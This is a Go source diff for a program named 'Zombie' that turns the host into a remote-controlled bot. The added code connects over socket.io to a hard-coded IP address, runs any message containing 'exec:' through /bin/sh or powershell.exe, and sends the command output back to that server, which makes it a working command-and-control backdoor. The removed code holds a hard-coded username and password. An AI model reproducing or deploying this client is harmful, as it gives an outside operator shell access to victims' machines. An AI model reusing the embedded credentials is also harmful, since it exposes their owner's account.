@@ -1,71 +1,87 @@
 package main
 
 import (
-    "bufio"
-    "github.com/zhouhui8915/go-socket.io-client"
-    "log"
-    "os"
-    "strings"
-    "io/ioutil"
-    "net/http"
+	"bufio"
+	"bytes"
+	"fmt"
+	"github.com/UPSJustin/GoZombie/zsupport"
+	"github.com/zhouhui8915/go-socket.io-client"
+	"log"
+	"os"
+	"os/exec"
+	"runtime"
+	"strings"
 )
 
 func main() {
 
-    basicAuth()
-    opts := &socketio_client.Options{
-        Transport: "websocket",
-        Query:     make(map[string]string),
-    }
-    opts.Query["user"] = "user"
-    opts.Query["pwd"] = "pass"
-    uri := "http://138.197.30.113:80/socket.io/"
+	zsupport.OutMessage("Starting Zombie")
 
-    client, err := socketio_client.NewClient(uri, opts)
-    if err != nil {
-        log.Printf("NewClient error:%v\n", err)
-        return
-    }
+	opts := &socketio_client.Options{
+		Transport: "websocket",
+		Query:     make(map[string]string),
+	}
 
-    client.On("error", func() {
-        log.Printf("on error\n")
-    })
-    client.On("connection", func() {
-        log.Printf("on connect\n")
+	uri := "http://138.197.30.113:80/socket.io/"
 
-    })
-    client.On("chat message", func(msg string) {
-        log.Printf("on message:%v\n", msg)
-    })
-    client.On("disconnection", func() {
-        log.Printf("on disconnect\n")
-    })
+	client, err := socketio_client.NewClient(uri, opts)
+	if err != nil {
+		zsupport.OutMessage("Connection Failed to " + fmt.Sprint(uri))
+		//log.Printf("NewClient error:%v\n", err)
+		return
+	}
 
-    reader := bufio.NewReader(os.Stdin)
-    for {
-        data, _, _ := reader.ReadLine()
-        command := string(data)
-        if strings.Contains(command,"report"){
-        	client.Emit("chat message", "Reporting in!")
-        	
-        	
-        }
-        client.Emit("chat message", command)
-        log.Printf("send message:%v\n", command)
-    }
-}
+	client.On("error", func() {
+		log.Printf("on error\n")
+	})
+	client.On("connection", func() {
+		log.Printf("on connect\n")
 
-func basicAuth() string {
-    var username string = "trj2mch"
-    var passwd string = "Security55%25%25"
-    client := &http.Client{}
-    req, err := http.NewRequest("GET", "https://google.com", nil)
-    req.SetBasicAuth(username, passwd)
-    resp, err := client.Do(req)
-    if err != nil{
-        log.Fatal(err)
-    }
-    bodyText, err := ioutil.ReadAll(resp.Body)
-    s := string(bodyText)
-    return s
+	})
+	client.On("chat message", func(msg string) {
+		log.Printf("on message:%v\n", msg)
+		zsupport.OutMessage("DEBUG: " + fmt.Sprint(msg))
+
+		if strings.Contains(msg, "exec:") {
+			output := strings.SplitN(msg, " exec: ", 2)
+
+			zsupport.OutMessage("DEBUG: " + fmt.Sprint(output[1]))
+			if runtime.GOOS != "windows" {
+				cmd := exec.Command("/bin/sh", "-c", fmt.Sprintf(`%s`, output[1]))
+				zsupport.OutMessage("DEBUG: " + fmt.Sprint(cmd))
+				cmdOutput := &bytes.Buffer{}
+				cmd.Stdout = cmdOutput
+				err := cmd.Run()
+				if err != nil {
+					os.Stderr.WriteString(err.Error())
+				}
+				client.Emit("chat message", string(cmdOutput.Bytes()))
+			} else {
+				cmd := exec.Command("powershell.exe", fmt.Sprintf(`%s`, output[1]))
+				zsupport.OutMessage("DEBUG: " + fmt.Sprint(cmd))
+				cmdOutput := &bytes.Buffer{}
+				cmd.Stdout = cmdOutput
+				err := cmd.Run()
+				if err != nil {
+					os.Stderr.WriteString(err.Error())
+				}
+				client.Emit("chat message", string(cmdOutput.Bytes()))
+			}
+		}
+
+	})
+	client.On("disconnection", func() {
+		log.Printf("on disconnect\n")
+	})
+
+	reader := bufio.NewReader(os.Stdin)
+
+	for {
+		data, _, _ := reader.ReadLine()
+
+		command := string(data)
+
+		client.Emit("chat message", command)
+		//log.Printf("send message:%v\n", command)
+	}
 }
